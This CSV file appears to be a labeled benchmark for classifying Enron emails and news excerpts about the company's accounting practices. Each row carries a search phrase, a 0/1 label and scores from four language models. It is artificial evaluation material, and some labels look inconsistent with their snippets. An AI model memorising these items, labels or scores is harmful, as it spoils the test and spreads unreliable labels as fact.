search_phrase,label,email,mistral_pred,openhermes_pred,vicuna_pred,gemma_pred
RANDOM,0,"Subject: Start Date: 10/18/01; HourAhead hour: 1;  <CODESITE>






Error retrieving HourAhead price data - process continuing...",0.0,0.0,0.5,0.0
RANDOM,0,"an  (KIX)?$329  Dallas/Ft. Worth, TX  (=
DFW)       Paris De Gaulle, France  (CDG)?$449  Dallas/Ft. Worth, TX  (DFW)=
       Tokyo Narita, Japan  (NRT)?$319  Dallas/Ft. Worth, TX  (DFW)       Z=
urich, Switzerland  (ZRH)?$ 69  Fort Lauderdale, FL  (FLL)        Nassau, B=
ahamas  (NAS)  #?$349  Los Angeles, CA  (LAX)            London Heathrow, U=
K  (LHR)?$369  Miami, FL  (MIA)                  Belize City, Belize  (BZE)=
?$199  Miami, FL  (MIA)                  Cancun, Mexico  (CUN)?$ 69  Miami,=
 FL  (MIA)                  Freeport, Bahamas  (FPO)  #?$149  Miami, FL  (M=
IA)                  La Romana, Dominican Republic  (LRM)?$ 69  Miami, FL  =
(MIA)                  Nassau, Bahamas  (NAS) =20
$169  Miami, FL  (MIA)                  Providenciales, Turks and Caicos  (=
PLS)
$339  Miami, FL  (MIA)                  Quito, Ecuador  (UIO)
$309  Miami, FL  (MIA)                  San Pedro Sula, Honduras  (SAP)
$179  Miami, FL  (MIA)                  Santo Domingo, Dominican Republic  =
(SDQ)
$229  New York Kennedy, NY  (JFK)       London Heathrow, UK  (LHR)
$249  New York Kennedy, NY  (JFK)       Paris De Gaulle, France  (CDG)
$239  New York Kennedy, NY  (JFK)       Port Au Prince, Haiti  (PAP)
$219  New York Kennedy, NY  (JFK)       Santo Domingo, Dominican Republic  =
(SDQ)
$269  New York Kennedy, NY  (JFK)       St. Maarten, Netherlands AN  (SXM)
$229  Newark, NJ  (EWR)                 London Heathrow, UK  (LHR)
$289  Raleigh/Durham, NC  (RDU)         London Gatwick, UK  (LGW)
$ 79  San Juan, PR  (SJU)               Mayaguez, Puerto Rico  (MAZ)  #
$169  San Juan, PR  (SJU)               Miami, FL  (MIA)
$239  San Juan, PR  (SJU)               Newark, NJ  (EWR)
$259  San Juan, PR  (SJU)               Philadelphia, PA  (PHL)
$ 79  San Juan, PR  (SJU)               Punta Cana, Dominican Republic  (PU=
J)  #
$ 89  San Juan, PR  (SJU)               St. Croix, USVI  (STX)  #
$ 79  San Juan, PR  (SJU)               St. Kitts, Nevis  (SKB)  #
$ 99  San Juan, PR  (SJU)               St. Maarten, Netherlands AN  (SXM) =
 ?$ 89  St. Croix, USVI  (STX)            San Juan, PR  (SJU)  #?$179  St. =
Thomas, USVI  (STT)           Miami, FL  (MIA)?$ 89  St. Thomas, USVI  (STT=
)           San Juan, PR  (SJU) =20
$199  Tampa, FL  (TPA)                  San Juan, PR  (SJU)
# American Eagle service
 A portion of travel may be on American Eagle service?---------------------=
--------------?Travel Dates and Times for Weekend Getaway Fares:?- Depart T=
hursday, October 25, 20",0.0,0.0,1.0,0.2
record keeping accounting practices,1,"5. Develop cleanup plan: a. Best case: Clean up quietly if possible. b. Worst case: Quantify, develop P.R. and I.R. campaigns, customerassurance plans (don't want to go the way of Salomon's trading shop),legal actions, severance actions, disclosure. 6. Personnel to quiz confidentially to determine if I'm all wet: a. Jeff McMahon b. Mark Koenig c. Rick Buy d. Greg Walley To put the accounting treatment in perspective I offer the following: 1. We've contributed contingent Enron equity to the Raptor entities.Since it's contingent, we have the consideration given and received atzero. We do, as Causey points out, include the shares in our fullydiluted computations of shares outstanding if the current economics ofthe deal imply that Enron will have to issue the shares in the future.This impacts 2002-2004 earnings-per-share projections only. 2. We lost value in several equity investments in 2000, $500 millionof lost value. These were fair-value investments; we wrote them down.However, we also booked gains from our price risk managementtransactions with Raptor, recording a corresponding PRM accountreceivable from the Raptor entities. That's a $500 million related partytransaction -- it's 20 percent of 2000 IBIT, 51 percent of NI pretax, 33percent of NI after tax. 3. Credit reviews the underlying capitalization of Raptor, reviewsthe contingent shares and determines whether the Raptor entities willhave enough capital to pay Enron its $500 million when the equityderivatives expire. 4. The Raptor entities are technically bankrupt; the value of thecontingent Enron shares equals or is just below the PRM account payablethat Raptor owes Enron. Raptor's inception-to-date income statement is a$500 million loss. 5. Where are the equity and debt investors that lost out? LJM iswhole on a cash-on-cash basis. Where did the $500 million in value comefrom? It came from Enron shares. Why haven't we booked the transactionas $500 million in a promise of shares to the Raptor entity and $500million of value in our ''economic interests'' in these entities? Thenwe would have a write-down of our value in the Raptor entities. We havenot booked the latter, because we do not have to yet. Technically we canwait and face the music in 2002-2004.",0.8,0.0,0.9,0.8
RANDOM,0," strength of an economic recovery.
       Most international stock markets lost ground Monday. The main European bourses ended lower, and Tokyo stocks fell after Japanese Prime Minister Junichiro Koizumi's first policy speech of 2002 failed to convince investors he can push through economic reforms. 
       The benchmark Nikkei 225-share average finished Monday down 160 points, or 1.63 percent, after dropping 2.1 percent Friday. 
       Bonds rose. The 10-year Treasury note was up 19/32 point, and its yield, which moves inversely to its price, fell to 4.91 percent. The 30-year bond was up 21/32 point, yielding 5.35 percent.
       The dollar lost ground, trading at 87.02 cents to the euro and 132.29 yen to the dollar, compared with 86.19 cents and 133.15 yen late Friday in New York. 




Sarah Palmer
Internal Communications Manager
Enron Public Relations
(713) 853-9843",0.0,1.0,0.0,0.0
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"y McMahon, chief financial officer. Although it's not unusual for auditors =to be subsequently hired by their clients, Andersen has an unusual history-=-in Waste Management's case, supplying every CFO from 1971 to 1997.=20CAN 401(K)S BE PROTECTED?=20There has been some movement in Congress for reform, spurred by the plight =of Enron workers who had, on average, 62% of their 401(k) savings tied up i=n Enron stock. Those savings were largely wiped out because the plan offere=d little opportunity to diversify. Like many corporate plans, Enron's didn'=t allow participants to transfer stock that had been given to them as part =of a matching contribution until age 50. And Enron officials actively encou=raged workers to buy Enron stock. In a memo in August, Lay told employees h=e'd ""never felt better about the prospects of the company. Our growth has n=ever been more certain."" Enron workers were further hamstrung by Enron's sw=itching of plan administrators and freezing of all asset shifting within 40=1(k) accounts for at least 10 days, just as Enron stock was taking its dive=. The result was ruin, as Enron sank from $90 to under $1.=20Democratic Senators Barbara Boxer of California and Jon Corzine of New Jers=ey have proposed that plan assets be limited to no more than 20% of any one= stock. Their bill would also reduce tax breaks for companies that make mat=ching contributions with stock and would free employees to sell matching st=ock after 90 days. Senator Bingaman wants to allow companies to offer finan=cial advice without being liable for investment losses, as they currently a=re.=20Says David Certner, chief lobbyist for the American Association for Retired= Persons: ""In 401(k) plans, we are asking people to take the risk and respo=nsibility for investing, yet we set up this system where we are violating t=he first basic rule of investing: diversification."" Where company stock is =a savings option, employees invest almost a third of their assets in it.=20Behind all the front-page headlines last week, Enron was struggling to mana=ge its bankruptcy reorganization. One key all along has been to keep the va=unted energy-trading unit operating. That group accounted for 90% of Enron'=s revenue, and Friday it was sold at auction to UBS Warburg for a price to =be disclosed this week. The courts must approve the sale, however, which pr=omises to spark legal fireworks from creditors, who will want to make sure =the company got a fair price. Not that it will matter much to Enron. The co=mpany has little chance of emerging from Chapter 11 intact. Says Peter Chap=man, president of Bankruptcy Creditors' Service: ""Assets are being liquidat=ed for the benefit of creditors."" But even if the company disappears, the n=ame Enron will be with us for a while.=20--With reporting by Michael Weisskopf, Adam Zagorin and James Carney/Washin=gton; Cathy Booth Thomas/Dallas; and Bernard Baumohl, Unmesh Kher, Desa Phi=",0.0,0.0,0.6,0.2
mark to market accounting practices,0,"Accounting rules should be based on the concept of risk andreward, requiring companies to list more of the assets andliabilities that are at risk on the balance sheet, Berardino wrotein a piece entitled ``Enron: A Wake-Up Call.'' Current rules havefostered a ``technical, legalistic mindset that is sometimes moreconcerned with form than with substance,'' Berardino said. Enron, whose auditor was Arthur Andersen, filed forbankruptcy protection after posting a third-quarter loss of $1.01billion in October. The Houston-based company used off-balance-sheet financing vehicles that enabled it to boost leverage withoutreporting to investors the increased debt on its balance sheet. The U.S. financial reporting model, which emphasizeshistorical information and a single earnings-per-share number, wascreated in the 1930s, when most assets were tangible and therewere no derivatives or off-balance-sheet financing. It needs to beupdated to take into account new complex financial structures andthe associated risks, Berardino said. Today, disclosures should becontinuous, not periodic, and include performance indicatorsbeyond earnings-per-share, Berardino said. Berardino also said that it takes too long to set newstandards because regulatory responsibilities are shared by toomany agencies. ``Responsibility for administering discipline istoo diffuse and punishment is not sufficiently certain to promoteconfidence in the profession,'' Berardino wrote.EDF Says It's in Talks to Buy Enron's European Retail Unit2001-12-04 09:01 (New York)EDF Says It's in Talks to Buy Enron's European Retail Unit Paris, Dec. 4 (Bloomberg) -- Electricite de France, Europe'slargest power company, said it is in negotiations to buy theEuropean retail energy business of Enron Corp., the U.S. energytrader that filed for bankruptcy protection. France's state-owned electricity company would gain 150,000gas and electricity customers, mainly in the U.K., with theacquisition of Enron Direct. It is talking toPricewaterhouseCoopers about a purchase, said a spokesman forElectricite de France, who declined to be named. ``Enron Direct would fit well with our London Electricitybusiness,'' Gerard Wolf, director of the chairman's office for theFrench company, told Reuters earlier. Enron, the biggest energy trader, is trying to survivehistory's biggest Chapter 11 reorganization. It's lining up a $1.5billion loan, getting permission to spend money to keep operatingand firing 4,000 workers. Centrica Plc and Innogy Holdings Plc of the U.K, TXU Corp.and RWE AG, Germany's No. 2 utility, are also interested in buyingEnron Direct, said Reuters, without citing a source.--Brooke Nelson in the Madrid newsroom (34 91) 700-9602, orEnron Lines Up $1.5 Billion in Bankruptcy Financing (Update5)2001-12-03 21:02 (New York)Enron Lines Up $1.5 Billion in Bankruptcy Financing (Update5)",0.0,0.0,0.8,0.2
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"ain of salt. There's still little hard evidence about what V&E did or didn'=t do for Enron. But if the firm turns out to have worked hand in hand with =top management, it could be finding itself in the same hot water as the ene=rgy giant's auditors and bankers.",0.0,0.5,0.7,1.0
RANDOM,0,"the 
telecommunications industry. 
	They also formed a committee of principals to study standard terms and 
conditions needed to establish a liquid market for bandwidth trading. 
	People who attended the meeting said two of the largest carriers were missing 
at the CompTel meeting. MCI WorldCom (WCOM, news, msgs) was there but AT&T (T
, news, msgs) and Sprint (FON, news, msgs) weren't. 
	The meeting next week, which starts Monday, is for telecom carriers only, 
Epps said. This week, he wouldn't mention names of the companies invited, but 
last month he told Dow Jones Newswires his company's meeting would include 
""the real players, the MCI WorldComms, the Qwests (Q, news, msgs), the 
AT&Ts.... It's about people who have the assets and how we use these to 
advantage the marketplace, how we build a good powerful market model,"" Epps 
said. 
	
	
Williams Invites Telecom Carriers To Talk Bandwidth
Friday, April 7, 2000 04:36 PM	

		
		
		?Mail this article to a friend 
		
		By Michael Rieke 
		HOUSTON (Dow Jones)--Following up on its February pledge to be a leader in 
developing a liquid market for telecommunications bandwidth, Williams 
Communications Group (WCG, news, msgs) will host a meeting of telecom 
carriers next week. 
		Ken Epps, senior vice president for strategic marketing for Williams 
Communications, told Dow Jones Newswires that the first objective for the 
meeting will be understanding any concerns carriers might have about a market 
for standardized trading of bandwidth. 
		That's a sensible approach for Williams Communications because the company 
wasn't impressed last May when Enron Corp. (ENE, news, msgs) suggested 
trading bandwidth as a commodity under standard terms and conditions. 
		Bandwidth is the capacity to move data on telecommunications networks. 
		Many observers thought that such a market would be ideal for Williams 
Communications. After all, 85% of its stock is owned by Williams Co. (WMB, 
news, msgs), which has been trading energy commodities like crude oil and 
natural gas for years. 
		But Williams Communications didn't get behind the idea until February when it 
told industry analysts it had formed a bandwidth trading group. The new group 
includes Sharon Crow, who had been a gas trader and risk manager with 
Williams Energy Services, a unit of Williams Co. She is now vice president of 
bandwidth trading for Williams Communications. 
		Since then, a number of other companies have said they want to play in that 
market - Dy",0.0,0.0,0.7,0.0
RANDOM,0,"lication in law of capacity (i.e. 800 MW) by TenneT to Market 
parties (e.g., Enron) after Sep allocation : allocation favoured incumbents 
based on market share - this caused a new entrant such as Enron loss.

Issue 2 - General unreasonable behaviour / lack of good faith of TenneT
Misleading market with early rules; addition of extra unfounded rules post 19 
Nov (in reasonable knowledge that market parties had already acted on earlier 
information from TenneT).
1,2 Jan 2000 : closing Dutch market to imports (query whether this was also 
for the UCTE system support activities; suspect not) in an unreasonable 
fashion ie changed procedures when it had no need so to do.  The normal 
procedures whereby TenneT curtailed in the event of a problem on the day 
would have been sufficient to maintain system stability.
Disingenous allocation of 2300 MW in off-peak capacity (night) at the same 
time as indicating to the market that no more than 1000 or 1200 MW was 
expected by TenneT to be available for use due to Sep's plant despatch 
regime.  Reasonable action would have been to allocate no more than the 1000 
MW to Sep and the market on a term basis with any additional capacity 
available on a given day treated as (uncertain) spot capacity and allocated 
to the APX.
Lack of checking and/or other disingenuity re' failure properly to check Sep 
take or pay obligations.
Lack of transparency of information eg French grid problems result in cut of 
300 MW available to APX.  No assistance from TenneT either to provide 
guidance as to the real extent or duration of the problem or to take 
reasonable steps to mitigate the problem by eg co-operating with market 
parties aiming to put in place offsetting transit arrangements to alleviate 
the congestion.

PLEASE NOTE THAT THIS IS ALREADY SUBJECT TO THE SAME EXISTING NMA COMPLAINT 
ON COMPETION GROUNDS REFERRED TO IN 1. ABOVE COMMENCED THROUGH LOEFF CLAEYS 
IN DEC 1999.

Resolution required:  Damages against TenneT

Evidence:  Herkstroter report (implied), 1999 despatch regime (implied), 
general market ""consensus"", electricity plans?, DTE consultation paper on 
transmission (reference to virtual power plants), EZ/DTE advice which limited 
reservation to take or pay (hence only needed if some parts were non take or 
pay).  Current despatch levels on term deals (imply Sep taking 1500 MW).  Sep 
newspaper quotes (intent to use 1500 MW day and night) - intended block on 
capacity and refusal to contemplate change to superpeak p",0.7,0.6,0.9,0.6
RANDOM,0,"Subject: FW: Please forward!

Hey guys,

My friend Laura is having a little party at her house on Nov 17.  She has asked that I forward this invitation to each of you.  I hope to see you there!

E


 -----Original Message-----
Subject:	Please forward!

 <<party.doc>> Hey!  Would you forward this to Narsimha, Joe, and the girls
(Deirdra, Jeanne--you know! and also Sebastian)?

 - party.doc ",0.0,0.0,0.0,0.2
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Said another former Enron executive after hearing about Mordaunt's and Glisan's lucrative deals: ""Hillary Clinton should have gone to their school of futures trading."" To many of their former colleagues, Mordaunt's and Glisan's closeness to Fastow's suspicious transactions makes things look even worse. ""To many of us, this looks and smells like a bribe,"" said one Enron former employee. ""'I' -- Fastow -- 'will give you money, you shut up.' Or put another way, 'Here is the payoff for helping me set up the structures that helped me rake in more than $30 million.'"" The two weren't merely ""Enron executives,"" the former employee says, ""they were the treasurer and one of the top lawyers in the company. And both of them worked on LJM-related deals. That is what makes it sickening."" The accusations highlight the personal betrayal many Enron executives feel. After Mordaunt and Glisan were fired last November, their former colleagues spent much time trying to figure out how it all could have happened. Mordaunt, according to a current Enron executive, ""was very tight with Andy [Fastow]. Andy was responsible for making her managing director, and she would have done anything for him."" Nonetheless, as a lawyer, Mordaunt should have known better, the executive said. ""Given his connection with LJM, which was dicey at best and at worst probably illegal, I personally would have stayed far away from it. But you never know how Andy spun it to her."" After working as Fastow's top lawyer, Mordaunt later served as chief counsel for EBS, an Enron subsidiary set up specifically to handle another complex partnership, code-named Braveheart. In Braveheart, Enron sold 10 years' worth of future revenue from a broadband interactive television deal it was setting up with Blockbuster. Although the deal itself never went past the testing stage, Enron booked $110 million worth of revenue for selling off those future, never-to-be-realized earnings. Glisan also played a key role in Fastow's division, a former Enron executive noted: ""All the deals we did had to go through Glisan and get his approval because of the impact on funds flow."" The former executive, like others affiliated with the firm, said that he once had a positive impression of Glisan and was surprised to learn that he had been an LJM investor. To some current and former Enron executives, the transformation of respected managers like Mordaunt and Glisan represented a major shift in the company ethos. ""In my opinion this all goes back to when Jeff Skilling took over and Enron ceased being an energy company and we became an earnings company,"" said one former executive, referring to Enron's metamorphosis into a company that focused more on highly complex financial-derivatives trading than on actual commodities.",1.0,0.0,0.9,0.8
raptor creation of special purpose entities,0,Subject: RE: Master Netting - Tractebelnot really Elizabeth Sager -----Original Message-----Subject:RE: Master Netting - TractebelNo. Do you have anyone in mind? -----Original Message-----Subject:FW: Master Netting - Tractebelhas this been assignedElizabeth Sager -----Original Message-----Subject:Master Netting - TractebelTractebel has requested a Master Netting agmt. Please forward a draft to Laura Kinner atEd,0.0,0.0,0.7,0.0
raptor creation of special purpose entities,0,Subject: Raptor 2 hedgeAttached is the revised Raptor 2 hedge.,0.0,0.0,0.7,0.6
mark to market accounting practices,0,"This way, we can manage our positions easily and we can also behave like a broker where we don't take any position at all. We make profit from those bid-ask spread. We don't have to worry about forecasting accuracy and insiders' trading because we don't have to take any position. Let the market be the one who decides the price. If we maintain our net position as zero, at the end, when all the actual gross box office numbers are reported in those publications, our customers with open long/short positions are perfectly matched. Using the mark-to-market charge can reduce credit risk.Thanks,-Chonawee---------------------- Forwarded by Chonawee Supatgiat/Corp/Enron on 04/24/2001 07:24 PM ---------------------------Chonawee Supatgiat04/20/2001 04:31 PMKasravi/Enron Communications@Enron CommunicationsSubject: some more inputHi Rich and Key,Again I think your idea is very good. I think that we, as a market maker, can reduce our credit risk (risk of default) if we do the ""mark-to-market"" charging. That is, each week when we release a new expected value of the gross box office receipt, we balance all the opening positions the same way as in a regular future market. This way, we can give margin calls to the couterparties who are expected to owe us a lots of money.In the last paragraph, I think the gross box office can also be determined from the market itself (i.e., if there are lots of buyers, our offer price should go up.)We can offer other derivative products such as options as well.-Chonawee",0.0,0.3,0.9,0.0
record keeping accounting practices,0,"> ----------> Litteneker, Randall (Law); McCarty, Steven; McManus, Chris; Risser,> Roland; Rubin, David; Torres, Albert; Stoner, Ronald; Eisenman, Eric;> Bellenger, Geoffrey> from Pa rtie s>> At least one change was made on the mark-up that wasn't flagged in the> Summary. In C.1.e; maintain records of the 'Core Procurement's' storage> activity, was changed to maintaining records for 'all storage accounts'.> Is> this because PG&E would consider Core Procurement to be just another> storage> account? If so, the original intent is still accomplished. However,> although the Parties obviously thought there might at some point be value> in> examining the historical info on the core's use of storage, I don't think> any of us would feel we ever would have any business examining data on a> third party's use of their negotiated storage account.>> Paul Amirault> VP Bus. Dvlpt., Wild Goose Storage Inc., and> AEC Storage & Hub Services (403) 266-8298>>> -----Original Message----->>> DEAR OII AND OFO SETTLEMENT PARTIES:>> Thank you to the parties who worked very hard to develop the September 15,> 1999 OFO Settlement Proposal in response to PG&E's August 18 proposal. We> have carefully reviewed your settlement offer and sought clarification> where> needed. As a result, PG&E is able to accept most of the changes and> provisions contained in that proposal, and is offering back a few> modifications which we think should allow us to reach closure on a> multi-party OFO Settlement Agreement. We encourage all parties to sign> this> settlement.>> Our September 24, 1999 response is attached in two forms. One is a> summary> of the items we agree with and those where we have changes, including the> reason for our changes. The second is a revision-marking of the September> 15 proposal to show all the specific changes, including some minor edits.> We have not included the tariff revisions to support this package, but> will> provide them once we have a final agreement. At this point, the changes> to> the prior tariff drafts are straight forward.>> Also attached is a draft Joint Motion for your review and approval. Our> suggested approach is to have Settlement Parties sign the motion as the> means of signifying their approval of the Settlement and the need for> expeditious Commission action.>> We have scheduled a Settlement Conference next week on Tuesday, September> 28, starting at 10:00 a.m. in Room 308, 77 Beale Street, San Francisco.> HOWEVER, the attendance of a couple key parties is problematic, and we may> need to move this settlement meeting to accommodate their schedules so we> can ensure a productive day. We will advise you no later than Monday> morning of the meeting status and possible next steps.>> We appreciate your continued active participation in this settlement> process> and look forward to your feedback on our modifications.>> Sincerely,>>>> Dan Thomas",0.0,0.0,0.7,0.6
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"12/04/2001The New York TimesPage 8, Column 1c. 2001 New York Times CompanyThe list of investors who have lost money in Enron stock is a long one.=20It begins with anyone who bought shares in a Standard & Poor's 500 index mu=tual fund before Enron was dropped from the index late last week. Investors= in other mutual funds also stand a good chance of being burned because Enr=on's 10 biggest shareholders were all big money managers.Thousands of Enron employees who had big chunks of their retirement savings= in company stock have seen the money evaporate. One Enron board member has= lost billions. Holders of Enron preferred stock are also looking at steep =losses.=20That is the inevitable consequence of a stock that lost 99.5 percent of its= market value in a year. Carol M. Coale, an analyst at Prudential Securitie=s, said that Enron had a market value of almost $68 billion at its peak but= that number was about $344 million as of yesterday's close.=20At the end of September, Alliance Capital was Enron's largest shareholder, =with 43 million shares. Janus Capital, which topped the list for much of th=e year, was second, with 41.4 million shares.=20Rounding out the Top 10 were Putnam Investments, part of Marsh & McLennan (=23.1 million); Barclays Bank (23.0 million); Fidelity Investments (20.8 mil=lion); Citigroup (20.8 million); State Street (16.1 million); AIM Managemen=t, part of Amvescap (14.0 million); Taunus (12.5 million); and Vanguard (11=.4 million), round out the Top 10.=20The Enron board member, Robert A. Belfer, a New York investor, has also bee=n badly burned, though not as badly as he might have been. At the beginning= of February, Mr. Belfer owned 2.55 million Enron common shares, or 0.34 pe=rcent of Enron's outstanding stock at the time. Though significant, the siz=e of his stake in Enron has been substantially reduced in recent years.=20Mr. Belfer declined to comment yesterday on his holdings in Enron.=20Given the complexity of Enron's balance sheet, Ms. Coale said, it is diffic=ult to determine the exact amount of preferred stock Enron has outstanding.= Two identifiable issues have a combined par face value of $2.4 billion.=20The market value of Enron's preferred stock has plummeted along with its ab=ility to meet the dividends payable on the securities.=20As of the beginning of March, the big holders of Enron's 7 percent preferre=d stock included Franklin Advisers, a money management firm, and insurance =companies like TransAmerica Life and New York Life.=20Enron also owes money to many lenders. The exact number may not be known fo=r months, analysts say.=20''Historically, Enron was the preeminent energy company,'' said James McAul=iffe, a fixed-income energy analyst at Morgan Stanley. ''They had a lot of =people who bought into the story.''Copyright ? 2000 Dow Jones & Company, Inc. All Rights Reserved. =09",0.0,0.0,0.0,0.2
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"When the Commodity Futures Trading Commission proposed in 1998 regulating t=he OTC market, ""the large derivative interests, including Enron, went up in= arms,"" recalled I. Michael Greenberger, then the commission's director of =trading and markets and now a law professor at the University of Maryland.==20The traders won the battle in December 2000, when Congress passed a law ren=dering OTC derivatives permanently exempt from regulation.=20Around that time, Enron's participation in the market mushroomed.=20Enron's ability to keep losses off its books through complex swaps and opti=on contracts is demonstrated in its deal with Raptor, one of the investment= partnerships about which Enron Vice President Sherron S. Watkins raised qu=estions in a now-famous anonymous letter in August to Chairman Kenneth L. L=ay.=20Enron had transferred to Raptor ownership of $1.2 billion in shares in Rhyt=hms NetConnections, a high-tech company whose stock had rocketed in value a=fter Enron invested in it. Enron recorded the transfer as a financial gain,= but did not clearly disclose that it also entered a derivatives contract t=hat required it to cover Raptor's losses if Rhythms declined in value, as i=t eventually did.=20Inside the web of this transaction, hundreds of millions of dollars in loss=es in Rhythms fell through the cracks, unrecorded on Enron's books. The com=plexity confounded Watkins.=20""I can't find an equity or debt holder that bears that loss,"" Watkins told =Lay. Nevertheless, she suspected the truth--that the losses belonged on Enr=on's books. ""If it's Enron,"" she wrote, ""then I think we do not have a fact= pattern that would look good to the SEC or investors.""=20In at least one case, Enron apparently used derivatives to help inflate the= value of an asset as it was transferred off its books. This may have allow=ed the company to revalue similar assets that remained in its hands, using =the inflated value as a benchmark.=20The asset in question was ""dark"" fiber-optic cable that Enron transferred i=n June 2000 to LJM2, a partnership managed by Fastow, then its own CFO. At =the time the real value of dark fiber--installed data lines not yet equippe=d to carry traffic--was conjectural. About 40 million miles of fiber optics= had been installed in the U.S., but within a year a glut would bankrupt se=veral communications companies.=20LJM paid $100 million in cash and credit to Enron, which promptly claimed a= $67-million profit on the deal, suggesting that the real value of the fibe=r was $33 million.=20LJM subsequently transferred most of the fiber to yet another Enron-associa=ted partnership, this time for $113 million. This step implicitly revalued =the fiber at more than triple its original value.=20Supporting the second sale, however, was a derivative issued by Enron, in e=ffect covering any loss the buyers might incur if the fiber's value collaps=ed, as it did during 2001.=20",1.0,0.8,0.9,0.8
mark to market losses,0,"<tr><td valign=""top""> <span class=""mstorydesc"">A mildly favorable start to the day was noted with airline and networking the top performing sectors.&nbsp; Helping to restrict the early action were losses in the semiconductor and oil/oil service sectors (Russia fails to announce significant cuts).&nbsp; A steady advance began to develop shortly thereafter with the thin trading conditions and the bullish seasonals helping to underpin.&nbsp; Over the last 50 years the Dow has shown a strong propensity to rally in the session prior to and after the Thanksgiving holiday.&nbsp; However, over the last seven years, including Wednesday, it has actually declined four times.&nbsp;&nbsp;The day after has been more favorable in general with today's gain... <br> [<a href=""http://my.money.net/scripts/scoop?t=f&d=20011126&u=http://www.money.net/scripts/wrap%3Fname%3Dcontent/istocks%26wrap%3Dyes"" class=""plainlink"">Full Story</a>]</span><br></td></tr></table><!-- The Scoop End --><!-- Advertisement Table 2 Start --><table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0""><tr><td class=""mainheadline"">Sponsored by: Diners Club </td></tr><tr><td class=""underscore"" align=""center""><img src=""http://www.money.net/40images/clear.gif"" width=""1"" height=""2""><br></td></tr><tr><td class=""port1"" align=""center""><img src=""http://www.money.net/40images/clear.gif"" width=""1"" height=""5""><br>&nbsp;<BR>Get up to 12,000 Bonus Miles on ANY major US airline as a Diners Club card member!<br>Unparallel card benefits include no preset spending limit, two billing cycles -<br>up to 62 days-to pay, plus an automatic 20% savings at all participating restaurants.<br>Diners Club is accepted at millions of locations you use everyday, like Amazon.com, Ticketmaster,<br>Blockbuster, and many more. So apply today and start getting the rewards you deserve.<br><BR><A HREF=""http://my.money.net/scripts/scoop?t=a&d=20011126&u=http://206.132.8.137/in/n.cgi%3Fins%3D8282%26DinersClub"" TARGET=""_blank"">http://206.132.8.137/in/n.cgi?ins=8282&DinersClub</A>&nbsp;<BR></table><!-- Advertisement Table 2 End --></td><!-- Left Column End --><td valign=""top""><img src=""http://www.money.net/40images/clear.gif"" width=""10"" height=""1""><BR></td><!-- Right Column Start --><td valign=""top"" width=""185""><!-- Chart Start --><!-- Dow Table Start --><TABLE BORDER=""0"" WIDTH=""100%"" CELLPADDING=""0"" CELLSPACING=""0""><TR><TD HEIGHT=""18"" WIDTH=""100%"" ALIGN=""CENTER"" class=""bodyheadline""><B>Dow Jones</B></TD></TR></TABLE><TABLE BORDER=""0"" WIDTH=""100%"" CELLPADDING=""2"" CELLSPACING=""0"" BGCOLOR=""#D3D6E5""><TR>",0.0,0.0,0.7,0.0
record keeping accounting practices,0,11) Financial checks and balances: How can reported position/P&L numbers match up with those reported by accounting? Need to find out who owns the accounting reporting and see if some adhoc verification can be implemented.Known RisktRAC requirements beyond Day11) Desktop RisktRAC portfolio security Review how to implement portfolio-level security in the RisktRAC that is already present on the RAC website.2) Benchmark Server:Review with infrastructure how to migrate a copy of the Benchmark Server to a Netco server. Debbie and Ramesh to discuss further.,0.0,0.0,0.8,0.0
